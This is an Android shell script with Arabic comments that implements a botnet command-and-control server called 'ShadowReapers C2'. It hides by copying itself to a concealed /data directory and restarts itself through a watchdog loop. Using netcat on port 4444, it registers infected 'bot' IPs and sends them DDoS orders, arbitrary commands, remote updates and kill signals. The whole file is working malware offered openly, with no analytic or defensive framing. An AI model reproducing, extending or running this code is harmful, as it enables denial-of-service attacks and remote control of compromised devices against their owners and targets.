#!/system/bin/sh

# إعدادات
PORT=4444
DATA_DIR="/data/.sys_secure"
BOTS_FILE="$DATA_DIR/.bots_hidden"
LOG_FILE="$DATA_DIR/.c2_log"
SCRIPT_NAME=".usbctl"
BUSYBOX="/system/bin/busybox"
HIDE_PATH="$DATA_DIR/$SCRIPT_NAME"

# إنشاء مجلد وملفات مخفية
mkdir -p $DATA_DIR
touch $BOTS_FILE $LOG_FILE
chmod 600 $BOTS_FILE $LOG_FILE

# نسخ الذات للمكان الخفي وتشغيله من هناك
if [ "$0" != "$HIDE_PATH" ]; then
    cp $0 $HIDE_PATH
    chmod +x $HIDE_PATH
    nohup $HIDE_PATH >/dev/null 2>&1 &
    exit
fi

# Watchdog — لحماية السكربت من القتل
(
    while true; do
        if ! $BUSYBOX pgrep -f $SCRIPT_NAME >/dev/null; then
            nohup $HIDE_PATH >/dev/null 2>&1 &
        fi
        sleep 15
    done
) &

# دالة تسجيل
log() {
    echo "[$($BUSYBOX date '+%Y-%m-%d %H:%M:%S')] $1" >> $LOG_FILE
}

# التحقق من استجابة البوت
ping_bot() {
    echo "ping" | $BUSYBOX nc -w 2 $1 $PORT >/dev/null 2>&1
    return $?
}

# تشغيل السيرفر لتسجيل الزومبيز
(
    log "[+] ShadowReapers C2 started on port $PORT"
    while true; do
        $BUSYBOX nc -l -p $PORT | while read bot_ip; do
            if ! grep -q "$bot_ip" $BOTS_FILE; then
                echo "$bot_ip" >> $BOTS_FILE
                log "[*] New bot: $bot_ip"
            fi
        done
        sleep 1
    done
) &

# واجهة التحكم
(
    while true; do
        echo -n "[ShadowC2] > "
        read cmd target

        case $cmd in
            /bot)
                log "[+] DDoS against $target"
                while read ip; do
                    ping_bot $ip && echo "/ddos $target" | $BUSYBOX nc $ip $PORT
                done < $BOTS_FILE
                ;;

            /list)
                echo "[*] Bots list:"
                cat $BOTS_FILE
                ;;

            /status)
                echo "[*] Bot statuses:"
                while read ip; do
                    if ping_bot $ip; then
                        echo "[+] $ip is ONLINE"
                    else
                        echo "[-] $ip is OFFLINE"
                    fi
                done < $BOTS_FILE
                ;;

            /exec)
                echo "[*] Executing: $target"
                while read ip; do
                    ping_bot $ip && echo "$target" | $BUSYBOX nc $ip $PORT
                done < $BOTS_FILE
                ;;

            /update)
                echo "[*] Updating bots from: $target"
                while read ip; do
                    ping_bot $ip && echo "/update $target" | $BUSYBOX nc $ip $PORT
                done < $BOTS_FILE
                ;;

            /remove)
                sed -i "/$target/d" $BOTS_FILE
                log "[*] Removed $target"
                ;;

            /clean)
                echo "[*] Cleaning dead bots..."
                TMP_FILE=$($BUSYBOX mktemp)
                while read ip; do
                    if ping_bot $ip; then
                        echo "$ip" >> $TMP_FILE
                    else
                        log "[-] Removed dead bot: $ip"
                    fi
                done < $BOTS_FILE
                mv $TMP_FILE $BOTS_FILE
                ;;

            /killall)
                echo "[*] Sending kill command to all bots..."
                while read ip; do
                    ping_bot $ip && echo "/kill" | $BUSYBOX nc $ip $PORT
                done < $BOTS_FILE
                log "[*] All bots killed"
                ;;

            *)
                echo "[!] Unknown command"
                ;;
        esac
    done
) &
